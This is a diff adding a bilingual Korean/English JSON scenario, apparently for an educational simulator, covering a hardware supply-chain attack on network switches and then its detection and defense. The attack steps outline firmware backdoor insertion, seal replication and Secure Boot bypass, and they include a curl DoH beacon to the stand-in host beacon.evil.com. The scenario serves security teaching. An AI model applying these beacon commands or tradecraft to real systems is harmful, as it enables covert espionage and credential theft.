@@ -1,0 +1,154 @@
+{
+  "id": "T1195.003",
+  "title": "하드웨어 공급망 공격 시뮬레이션",
+  "titleEn": "Hardware Supply Chain Compromise Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "📦 배송 가로채기", "labelEn": "📦 Shipment Interception", "steps": [0] },
+    { "label": "🔧 펌웨어 변조", "labelEn": "🔧 Firmware Modification", "steps": [1] },
+    { "label": "🎯 백도어 활성화", "labelEn": "🎯 Backdoor Activation", "steps": [2] },
+    { "label": "🔍 탐지 & 방어", "labelEn": "🔍 Detection & Defense", "steps": [3, 4] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "APT\n(Supply Chain)", "x": 50, "y": 80 },
+    { "id": "logistics", "label": "Shipping\nCenter", "x": 180, "y": 30 },
+    { "id": "switch", "label": "Modified\nSwitch", "x": 180, "y": 130 },
+    { "id": "network", "label": "Corp\nNetwork", "x": 330, "y": 80 },
+    { "id": "c2", "label": "C2\nServer", "x": 480, "y": 80 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "logistics", "minStep": 0 },
+    { "from": "logistics", "to": "switch", "minStep": 0 },
+    { "from": "switch", "to": "network", "minStep": 2 },
+    { "from": "network", "to": "c2", "minStep": 2 }
+  ],
+  "desktopIcons": [
+    { "name": "UEFI Tool", "icon": "🔧" },
+    { "name": "Firmware", "icon": "💾" },
+    { "name": "X-Ray Scanner", "icon": "🔬" },
+    { "name": "TPM Verify", "icon": "🔏" },
+    { "name": "SIEM", "icon": "📊" }
+  ],
+  "steps": [
+    {
+      "cmd": "# 하드웨어 공급망 공격 - 배송 가로채기\n# 정보기관/APT 그룹이 물류센터에서 장비를 가로챔\n\n# 대상 장비 식별\nTarget: Enterprise Switch X9000\nOrder: 50대 (대기업 데이터센터용)\nShipment: FedEx Tracking #1234567890\nRoute: 제조사(중국) → 물류(홍콩) → 고객(한국)\n\n# 물류센터에서 가로채기\n# 10대를 수정 후 재포장\n# 봉인 스티커 복제\n# 시리얼 번호 유지",
+      "out": "[가로채기 성공]\nLocation: 홍콩 물류센터\nIntercepted: 10대 / 50대\nDuration: 4시간 (수정 + 재포장)\n\n[수정 내용]\n✅ 펌웨어 SPI Flash 덤프\n✅ 백도어 코드 삽입\n✅ 펌웨어 재프로그래밍\n✅ 봉인 스티커 복제 (UV 인쇄)\n✅ 원래 포장으로 재포장\n✅ 배송 재개\n\n[외관 검사]\n포장 상태: 정상 (봉인 무결)\n시리얼 번호: 원본과 동일\n무게: 차이 없음 (±1g)\nX-ray: 육안으로 구별 불가\n\n[수정 장비 배포]\n수정 10대 → 코어 스위치 위치로 설치 유도\n정상 40대 → 엣지 스위치로 배포",
+      "def": "[Supply Chain Alert] Shipment delayed 6 hours at Hong Kong logistics — potential interdiction",
+      "defAction": "Tool: Physical interception at logistics center\nTarget: 10/50 Enterprise Switch X9000 units\nModification: Firmware backdoor insertion\nRepackaging: Seal stickers replicated (UV print)\nDetection Difficulty: Very high (no visible changes)\nRisk Level: Critical — hardware-level compromise\nAction: Verify firmware hashes, check shipment logs",
+      "desc": "물류센터에서 네트워크 스위치 10대를 가로채 펌웨어에 백도어를 삽입합니다. 봉인 스티커를 복제하고 재포장하여 외관상 구별이 불가능합니다.",
+      "descEn": "Intercept 10 network switches at logistics center and insert firmware backdoors. Replicate seal stickers and repackage so they are visually indistinguishable.",
+      "stepTitle": "물류센터 가로채기 + 펌웨어 백도어 삽입",
+      "stepTitleEn": "Logistics Interception + Firmware Backdoor Insertion",
+      "feynman": "택배 중간에 상자를 열어 제품(네트워크 스위치)에 도청 장치(백도어)를 설치합니다. 상자를 원래대로 다시 봉하고 보내면, 받는 사람은 택배가 중간에 열렸다는 것을 알 수 없습니다.",
+      "feynmanEn": "Open the package mid-shipment, install a listening device (backdoor) in the product (switch). Reseal and ship — the recipient cannot tell the package was opened.",
+      "expert": "NSA의 TAO(Tailored Access Operations) 부서는 과거 Cisco 라우터를 물류 중간에 가로채 펌웨어를 수정한 사례가 있습니다(2013 NSA ANT 카탈로그). SPI Flash 칩에서 펌웨어를 덤프하고 수정 후 재프로그래밍하는 과정은 JTAG/SWD 인터페이스 또는 Flash 프로그래머로 수행합니다. 봉인 스티커의 홀로그램은 UV 인쇄 기술로 복제할 수 있으며, 고급 공격자는 원본과 동일한 재질을 사용합니다.",
+      "expertEn": "NSA's TAO division intercepted Cisco routers mid-shipment to modify firmware (2013 ANT catalog). Firmware dump/reprogram uses JTAG/SWD interfaces or Flash programmers. Holographic seal stickers can be replicated with UV printing; advanced actors use identical materials.",
+      "defTooltip": "🔐 물류센터 가로채기! 10대 펌웨어 수정!",
+      "defTooltipEn": "🔐 Logistics interception! 10 units firmware modified!",
+      "hackerLog": { "title": "interdiction.log", "lines": ["[14:00:00] 물류센터 접근", "[14:30:00] 10대 장비 가로채기", "[16:00:00] 펌웨어 수정 완료", "[18:00:00] 재포장 + 배송 재개"] },
+      "terms": [
+        { "term": "SPI Flash", "def": "Serial Peripheral Interface Flash, 펌웨어가 저장되는 비휘발성 메모리 칩" },
+        { "term": "JTAG", "def": "하드웨어 디버깅/프로그래밍 인터페이스, 칩의 펌웨어 읽기/쓰기에 사용" }
+      ]
+    },
+    {
+      "cmd": "# 펌웨어 백도어 상세 분석\n# UEFI 레벨 임플란트\n\n# 원본 펌웨어 덤프\nflashrom -p internal -r original_fw.bin\n\n# 백도어 삽입\n# 1. DXE 드라이버에 악성 모듈 추가\n# 2. 부팅 시 네트워크 스택에 미러링 코드 삽입\n# 3. C2 비컨 (DNS over HTTPS 사용)\n\nbinwalk -e original_fw.bin\n# UEFI 구조 분석\nUEFITool original_fw.bin",
+      "out": "[펌웨어 분석]\nChip: Winbond W25Q256JV (32MB SPI Flash)\nFormat: UEFI PI 1.6\nRegions: SEC, PEI, DXE, BDS\n\n[백도어 삽입 위치]\nDXE Phase: NetworkStackDxe에 후킹\n- 모든 네트워크 패킷 미러링\n- 특정 패턴 매칭 시 데이터 추출\n- DNS over HTTPS로 C2 비컨\n\n[백도어 기능]\n✅ 트래픽 미러링: 모든 VLAN 트래픽 사본\n✅ 자격증명 스니핑: HTTP/LDAP/SMB\n✅ C2 통신: DoH (Cloudflare 1.1.1.1 위장)\n✅ 펌웨어 업데이트 차단: 백도어 제거 방지\n✅ Secure Boot 우회: 자체 서명 키 등록\n\n[탐지 회피]\n- OS에서 보이지 않음 (하드웨어 레벨)\n- 정상 네트워크 트래픽으로 위장\n- 펌웨어 버전 표시: 정상 (위조)\n- 벤더 진단 도구 회피",
+      "def": "[Firmware Scan] Modified DXE driver detected — traffic mirroring module with DoH C2 beacon",
+      "defAction": "Tool: Flashrom + Binwalk + UEFITool\nChip: Winbond SPI Flash (32MB)\nBackdoor Location: DXE NetworkStackDxe driver\nCapabilities: Traffic mirroring, credential sniffing, DoH C2\nPersistence: Survives OS reinstall, blocks firmware update\nSecure Boot: Bypassed with rogue signing key\nDetection: Very difficult from OS level\nRisk Level: Critical\nAction: Replace hardware, forensic chip analysis",
+      "desc": "UEFI DXE 드라이버에 네트워크 트래픽 미러링 백도어를 삽입합니다. DNS over HTTPS로 C2 통신하며, 펌웨어 업데이트를 차단하여 제거를 방지합니다.",
+      "descEn": "Insert network traffic mirroring backdoor into UEFI DXE driver. C2 via DNS over HTTPS, with firmware update blocking to prevent removal.",
+      "stepTitle": "UEFI 펌웨어 백도어 + 트래픽 미러링 + C2",
+      "stepTitleEn": "UEFI Firmware Backdoor + Traffic Mirroring + C2",
+      "feynman": "스위치의 두뇌(펌웨어)에 도청기를 설치합니다. 이 도청기는 OS보다 더 깊은 곳에 있어서 컴퓨터 프로그램으로는 찾을 수 없습니다. 모든 대화(네트워크 트래픽)를 복사해서 몰래 외부로 보내고, 자신을 제거하려는 시도도 차단합니다.",
+      "feynmanEn": "Install a wiretap in the switch's brain (firmware). It sits deeper than the OS, invisible to software. It copies all conversations (network traffic), sends them out secretly, and blocks attempts to remove it.",
+      "expert": "UEFI DXE(Driver Execution Environment) 단계는 하드웨어 초기화 후 OS 로더 전에 실행됩니다. NetworkStackDxe를 후킹하면 모든 네트워크 I/O를 제어할 수 있습니다. DNS over HTTPS(DoH)를 사용하면 DNS 모니터링을 우회합니다. Secure Boot 우회는 PK(Platform Key)를 교체하거나 db(Authorized Signatures Database)에 공격자의 서명 키를 추가합니다. Intel Boot Guard가 활성화된 경우 OEM 키가 CPU 퓨즈에 소각되어 수정이 불가능합니다.",
+      "expertEn": "UEFI DXE runs after hardware init, before OS loader. Hooking NetworkStackDxe controls all network I/O. DoH bypasses DNS monitoring. Secure Boot bypass replaces PK or adds attacker keys to db. Intel Boot Guard with CPU-fused OEM keys prevents modification.",
+      "defTooltip": "🔐 UEFI 백도어! 트래픽 미러링 + DoH C2!",
+      "defTooltipEn": "🔐 UEFI backdoor! Traffic mirroring + DoH C2!",
+      "hackerLog": { "title": "firmware_mod.log", "lines": ["[16:00:00] SPI Flash 덤프", "[16:10:00] DXE 드라이버 분석", "[16:30:00] 백도어 모듈 삽입", "[17:00:00] 펌웨어 재프로그래밍"] },
+      "terms": [
+        { "term": "DXE", "def": "Driver Execution Environment, UEFI 부팅의 하드웨어 드라이버 로드 단계" },
+        { "term": "DoH", "def": "DNS over HTTPS, DNS 쿼리를 HTTPS로 암호화하여 모니터링 회피" }
+      ]
+    },
+    {
+      "cmd": "# 백도어 활성화 및 데이터 탈취\n# 수정된 스위치가 데이터센터에 설치됨\n\n# 설치 후 자동 활성화\n# 네트워크 트래픽 미러링 시작\n\n# 탈취 데이터 예시\ntcpdump -i mirror0 -w captured.pcap\n\n# C2 비컨 (DoH)\ncurl -s 'https://1.1.1.1/dns-query?name=beacon.evil.com&type=TXT' \\\n  -H 'Accept: application/dns-json'",
+      "out": "[백도어 활성화]\nSwitch: X9000-SN-A7B3C2 (코어 스위치)\nLocation: 데이터센터 Rack-A01\nVLANs: 12개 (서버, DB, 관리, DMZ 포함)\nUptime: 72시간 (설치 후)\n\n[트래픽 미러링]\nMirrored Packets: 847,293,000 (72시간)\nProtocols: HTTP, LDAP, SMB, RDP, SSH\n\n[탈취 데이터]\n✅ LDAP 자격증명: 15개 계정 (평문 바인드)\n✅ SMB 해시: NTLM 해시 47개\n✅ HTTP 세션 토큰: 23개\n✅ 내부 DNS 쿼리: 전체 구조 맵핑\n✅ 이메일 트래픽: SMTP 평문 12,847건\n\n[C2 통신]\nBeacon: 매 30분 DoH 쿼리\nData Exfil: DNS TXT 레코드 (Base64)\nVolume: 2.3GB / 72시간\nDetection: DNS 모니터링으로 감지 어려움",
+      "def": "[Network Monitor] Unusual DNS-over-HTTPS traffic from core switch — 2.3GB data exfiltration suspected",
+      "defAction": "Tool: Firmware backdoor (traffic mirroring + DoH C2)\nSwitch: Core switch in datacenter Rack-A01\nVLANs: 12 (including server, DB, management)\nCaptured: LDAP creds (15), NTLM hashes (47), sessions (23)\nExfil: 2.3GB via DNS TXT (Base64) over DoH\nDuration: 72 hours since installation\nRisk Level: Critical — complete network visibility\nAction: Replace switch, rotate all credentials, network forensics",
+      "desc": "데이터센터에 설치된 수정 스위치가 12개 VLAN의 모든 트래픽을 미러링합니다. LDAP 자격증명, NTLM 해시, 세션 토큰을 탈취하여 DoH로 외부에 전송합니다.",
+      "descEn": "Modified switch in datacenter mirrors all traffic across 12 VLANs. Captures LDAP credentials, NTLM hashes, and session tokens, exfiltrating via DoH.",
+      "stepTitle": "트래픽 미러링 + 자격증명 탈취 + DoH 유출",
+      "stepTitleEn": "Traffic Mirroring + Credential Theft + DoH Exfiltration",
+      "feynman": "도청 장치가 설치된 스위치가 회사의 모든 대화(네트워크 트래픽)를 엿듣습니다. 비밀번호, 파일, 이메일 등 모든 정보를 복사하여 암호화된 택배(DoH)로 외부에 보냅니다. 택배 겉면에는 '일반 DNS'라고 적혀 있어 검문소를 통과합니다.",
+      "feynmanEn": "The bugged switch eavesdrops on all company conversations (network traffic). Copies passwords, files, emails and sends them via encrypted courier (DoH). The courier's label says 'regular DNS' to pass checkpoints.",
+      "expert": "코어 스위치에 설치된 백도어는 SPAN/미러 포트 기능을 악용하여 모든 VLAN 트래픽을 캡처합니다. LDAP Simple Bind(포트 389)는 자격증명을 평문으로 전송하므로 스니핑에 취약합니다(LDAPS/636 사용 권장). NTLM 해시는 Pass-the-Hash 공격에 재사용 가능합니다. DoH(RFC 8484)를 통한 데이터 유출은 HTTPS 트래픽에 숨겨져 기존 DNS 모니터링으로 탐지가 어렵습니다. JA3/JA3S 핑거프린팅으로 비정상 TLS 클라이언트를 식별할 수 있습니다.",
+      "expertEn": "Core switch backdoor abuses SPAN/mirror port to capture all VLAN traffic. LDAP Simple Bind (port 389) transmits credentials in cleartext. NTLM hashes enable Pass-the-Hash attacks. DoH (RFC 8484) exfiltration hides in HTTPS traffic, evading DNS monitoring. JA3/JA3S fingerprinting identifies abnormal TLS clients.",
+      "defTooltip": "🔐 12 VLAN 트래픽 미러링! 2.3GB 유출!",
+      "defTooltipEn": "🔐 12 VLAN traffic mirrored! 2.3GB exfiltrated!",
+      "hackerLog": { "title": "exfil.log", "lines": ["[Day 1] 스위치 설치 + 백도어 활성화", "[Day 1] 트래픽 미러링 시작", "[Day 3] LDAP/NTLM 자격증명 47건 탈취", "[Day 3] 2.3GB DoH 유출 완료"] },
+      "terms": [
+        { "term": "SPAN Port", "def": "Switched Port Analyzer, 네트워크 트래픽을 모니터링 포트로 복사하는 스위치 기능" },
+        { "term": "Pass-the-Hash", "def": "탈취한 NTLM 해시를 사용하여 비밀번호 없이 인증하는 공격 기법" }
+      ]
+    },
+    {
+      "cmd": "# 하드웨어 공급망 공격 탐지\n# 1. 펌웨어 무결성 검증\n# 2. 네트워크 이상 탐지\n# 3. 물리 검사\n\n# 펌웨어 해시 검증\nflashrom -p internal -r current_fw.bin\nsha256sum current_fw.bin\n# 벤더 공식 해시와 비교\n\n# TPM PCR 측정값 확인\ntpm2_pcrread sha256:0,1,2,3,4,5,6,7\n\n# 네트워크 이상 탐지\ntshark -r traffic.pcap -Y 'dns.qry.name contains \"1.1.1.1\"' -T fields -e ip.src",
+      "out": "[펌웨어 해시 검증]\nCurrent FW SHA256: a7c3...9f12\nVendor Official:   b8d4...2e34\n⚠️ 해시 불일치! 펌웨어 변조 확인!\n\n[TPM PCR 측정]\nPCR[0] (UEFI): 불일치 ⚠️ (기대값 vs 실제값)\nPCR[1] (Config): 불일치 ⚠️\nPCR[2] (Option ROM): 정상\nPCR[7] (Secure Boot): 불일치 ⚠️ (추가 키 발견)\n\n[네트워크 이상]\nDoH 트래픽 분석:\n  Source: 10.0.0.1 (코어 스위치)\n  Destination: 1.1.1.1:443 (Cloudflare DoH)\n  Volume: 2.3GB / 72시간 ⚠️\n  패턴: 30분 간격 정규 비컨 ⚠️\n  TLS JA3: 비정상 핑거프린트 ⚠️\n\n[물리 검사]\nX-ray 결과: 추가 칩 발견 안 됨\n무게 측정: 정상 범위\n봉인: 복제 흔적 (UV 검사 시 확인) ⚠️",
+      "def": "[SIEM] Firmware integrity violation — hash mismatch, TPM PCR deviation, DoH anomaly from core switch",
+      "defAction": "Tool: Flashrom + TPM + Network analysis + Physical inspection\nFirmware Hash: Mismatch with vendor official\nTPM PCR: 3 registers deviated (UEFI, config, Secure Boot)\nNetwork: 2.3GB DoH traffic from core switch (abnormal)\nTLS: Non-standard JA3 fingerprint\nPhysical: Seal replication detected under UV\nRisk Level: Critical\nAction: Replace all suspect hardware, full network forensics",
+      "desc": "펌웨어 해시가 벤더 공식 해시와 불일치하고, TPM PCR 측정값이 기대값과 다릅니다. 코어 스위치에서 비정상 DoH 트래픽 2.3GB가 발견됩니다.",
+      "descEn": "Firmware hash mismatches vendor official. TPM PCR measurements deviate from expected values. 2.3GB abnormal DoH traffic detected from core switch.",
+      "stepTitle": "펌웨어 해시 + TPM PCR + 네트워크 이상 탐지",
+      "stepTitleEn": "Firmware Hash + TPM PCR + Network Anomaly Detection",
+      "feynman": "제품을 검사하는 3가지 방법: 1) 제품의 지문(해시)을 공장 기록과 비교 → 다름! 2) 보안 칩(TPM)에 기록된 부팅 기록 확인 → 변조! 3) 스위치가 보내는 택배(DoH) 양이 비정상적으로 많음 → 2.3GB 유출!",
+      "feynmanEn": "3 inspection methods: 1) Compare product fingerprint (hash) with factory records — different! 2) Check boot records in security chip (TPM) — tampered! 3) Switch sending abnormally large courier (DoH) volume — 2.3GB leaked!",
+      "expert": "TPM(Trusted Platform Module) 2.0의 PCR(Platform Configuration Register)은 부팅 과정의 각 단계를 측정합니다. PCR[0]은 UEFI 펌웨어, PCR[7]은 Secure Boot 변수를 측정합니다. Remote Attestation으로 원격에서 PCR 값을 검증할 수 있습니다. JA3는 TLS Client Hello의 필드를 해시하여 TLS 클라이언트를 식별하는 핑거프린팅 기법입니다. 펌웨어 백도어의 TLS 구현은 정상 브라우저와 다른 JA3 해시를 생성합니다.",
+      "expertEn": "TPM 2.0 PCRs measure each boot stage. PCR[0] measures UEFI firmware, PCR[7] measures Secure Boot variables. Remote Attestation verifies PCR values remotely. JA3 fingerprints TLS clients by hashing Client Hello fields. Firmware backdoor TLS implementations generate different JA3 hashes than normal browsers.",
+      "defTooltip": "🔐 펌웨어 해시 불일치! TPM 변조! DoH 이상!",
+      "defTooltipEn": "🔐 Firmware hash mismatch! TPM tampered! DoH anomaly!",
+      "hackerLog": { "title": "hw_detection.log", "lines": ["[Day 4] 펌웨어 해시 검증 시작", "[Day 4] 해시 불일치 확인", "[Day 4] TPM PCR 3개 이상", "[Day 4] DoH 2.3GB 이상 트래픽 탐지"] },
+      "terms": [
+        { "term": "TPM", "def": "Trusted Platform Module, 하드웨어 보안 칩으로 부팅 무결성 측정 및 키 보관" },
+        { "term": "JA3", "def": "TLS 클라이언트 핑거프린팅, Client Hello의 특성으로 클라이언트를 식별" }
+      ]
+    },
+    {
+      "cmd": "# 종합 하드웨어 공급망 방어\n# 1. Secure Boot + TPM\n# 2. 물리 보안\n# 3. 펌웨어 모니터링\n# 4. 공급망 관리\n\n# Secure Boot 강화\nmokutil --sb-state\n# Secure Boot enabled\n\n# TPM Remote Attestation 설정\ntpm2_createak -C 0x81010001 -G rsa -g sha256 -s rsassa\n\n# 펌웨어 무결성 모니터링 (LVFS)\nfwupdmgr get-results\nfwupdmgr verify",
+      "out": "[Secure Boot + Intel Boot Guard]\n✅ Secure Boot 활성화 (UEFI)\n✅ Intel Boot Guard Profile 4 (Verified + Measured)\n✅ PK/KEK/db 관리 절차 수립\n✅ DBx (금지 목록) 정기 업데이트\n\n[TPM Remote Attestation]\n✅ TPM 2.0 기반 원격 증명\n✅ PCR 기대값 데이터베이스 구축\n✅ 부팅 시 자동 검증\n✅ 이상 시 네트워크 격리\n\n[물리 보안]\n✅ Tamper-evident 봉인 (홀로그램 + UV + QR)\n✅ 배송 GPS 추적 + 체인 오브 커스터디\n✅ 수령 시 X-ray/CT 검사 (고가 장비)\n✅ 시리얼 번호 벤더 직접 확인\n\n[펌웨어 모니터링]\n✅ LVFS (Linux Vendor Firmware Service) 연동\n✅ 월 1회 펌웨어 해시 검증\n✅ 자동 펌웨어 업데이트 알림\n✅ Firmware Transparency Log\n\n[공급망 관리]\n✅ 벤더 보안 평가 (연 1회)\n✅ 배송 경로 보안 등급 관리\n✅ 다중 소싱 (단일 제조사 의존 방지)\n✅ C-SCRM (Cyber Supply Chain Risk Management)",
+      "def": "[SIEM] Hardware supply chain defense deployed — Secure Boot, TPM attestation, physical security, LVFS",
+      "defAction": "Tool: Secure Boot + TPM + Physical Security + LVFS\nSecure Boot: Enabled with Intel Boot Guard\nTPM: Remote Attestation with PCR verification\nPhysical: Tamper-evident seals, GPS tracking, X-ray\nFirmware: Monthly hash verification, LVFS updates\nSupply Chain: Vendor assessment, multi-sourcing, C-SCRM\nRisk Level: Low (with full implementation)\nAction: Maintain attestation infrastructure, quarterly audits",
+      "desc": "Secure Boot + Intel Boot Guard로 펌웨어 무결성을 보장하고, TPM Remote Attestation으로 원격 검증합니다. 물리 보안과 C-SCRM으로 공급망 전체를 관리합니다.",
+      "descEn": "Secure Boot + Intel Boot Guard ensure firmware integrity. TPM Remote Attestation enables remote verification. Physical security and C-SCRM manage entire supply chain.",
+      "stepTitle": "Secure Boot + TPM + 물리 보안 + C-SCRM",
+      "stepTitleEn": "Secure Boot + TPM + Physical Security + C-SCRM",
+      "feynman": "4겹 방어: 1) 제품이 켜질 때 자기 신분증(서명)을 확인(Secure Boot), 2) 보안 칩(TPM)이 매 부팅마다 건강 검진(PCR 측정), 3) 택배에 특수 봉인(홀로그램+UV+GPS)을 달아 중간에 열리면 즉시 감지, 4) 제조사부터 설치까지 전체 과정을 관리(C-SCRM).",
+      "feynmanEn": "4-layer defense: 1) Product checks its ID (signature) on boot (Secure Boot), 2) Security chip (TPM) runs health checks every boot (PCR measurement), 3) Special seals on shipments (hologram+UV+GPS) detect tampering, 4) Manage entire process from manufacturer to installation (C-SCRM).",
+      "expert": "Intel Boot Guard는 ACM(Authenticated Code Module)으로 초기 부팅 코드를 검증하며, OEM 키가 CPU의 FPF(Field Programmable Fuses)에 소각되어 변경이 불가능합니다. C-SCRM(Cyber Supply Chain Risk Management)은 NIST SP 800-161에 정의된 프레임워크로, 공급망 전체의 사이버 보안 위험을 관리합니다. LVFS(Linux Vendor Firmware Service)는 fwupd 기반 펌웨어 업데이트 및 검증 서비스로, 1,000개 이상의 벤더가 참여하고 있습니다.",
+      "expertEn": "Intel Boot Guard's ACM verifies initial boot code with OEM keys burned into CPU FPFs (unchangeable). C-SCRM (NIST SP 800-161) manages cyber security risks across the entire supply chain. LVFS with fwupd provides firmware update and verification with 1,000+ participating vendors.",
+      "defTooltip": "🔐 Secure Boot+TPM+C-SCRM 하드웨어 방어!",
+      "defTooltipEn": "🔐 Secure Boot+TPM+C-SCRM hardware defense!",
+      "hackerLog": { "title": "defense_deploy.log", "lines": ["[Day 5] Secure Boot + Boot Guard 활성화", "[Day 5] TPM Remote Attestation 구축", "[Day 5] 물리 보안 절차 수립", "[Day 5] C-SCRM 프레임워크 도입"] },
+      "terms": [
+        { "term": "C-SCRM", "def": "Cyber Supply Chain Risk Management, 공급망 사이버 보안 위험 관리 프레임워크" },
+        { "term": "Boot Guard", "def": "Intel의 하드웨어 기반 부팅 무결성 검증, CPU 퓨즈에 OEM 키 소각" }
+      ]
+    }
+  ],
+  "processTree": {
+    "name": "UEFI DXE Phase",
+    "pid": 0,
+    "children": [
+      {
+        "name": "NetworkStackDxe (backdoor)",
+        "pid": 1,
+        "children": [
+          { "name": "TrafficMirror.efi", "pid": 2, "children": [
+            { "name": "DoH Beacon (1.1.1.1:443)", "pid": 3, "children": [] }
+          ] }
+        ]
+      }
+    ]
+  }
+}
